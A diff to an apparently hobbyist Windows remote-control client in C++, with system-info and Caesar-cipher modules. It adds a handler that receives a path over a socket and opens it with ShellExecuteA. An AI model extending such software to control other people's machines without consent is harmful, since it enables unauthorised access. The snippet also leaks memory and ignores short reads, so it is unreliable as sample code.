@@ -6,7 +6,7 @@
 #include <direct.h>
 #include <windows.h> // https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/
 #include <sstream>
-#include <shellapi.h>
+#include <shellapi.h> // https://learn.microsoft.com/en-us/windows/win32/api/shellapi/
 #include "Encryption-Techniques/CaesarCipherShift.h"
 #include "System-Info/info.h"
 
@@ -162,9 +162,16 @@ int main(int argc, char* argv[]) {
                     bytesRec = recv(sock, (char*)&pathLen, sizeof(pathLen), 0);
 
                     if(bytesRec > 0 && pathLen > 0 && pathLen < 10000) {
-                        std::cout << "recevied : " << bytesRec << std::endl;
-                    } else {
-                        std::cout << "test";
+                        char* pathBuf = new char[pathLen + 1];
+                        bytesRec = recv(sock, pathBuf, pathLen, 0);
+
+                        if(bytesRec > 0) {
+                            pathBuf[pathLen] = '\0';
+                            std::string path(pathBuf);
+                            delete[] pathBuf;
+
+                            ShellExecuteA(NULL, "explore", path.c_str(), NULL, NULL, SW_SHOWNORMAL);
+                        }
                     }
                     break;
                 }
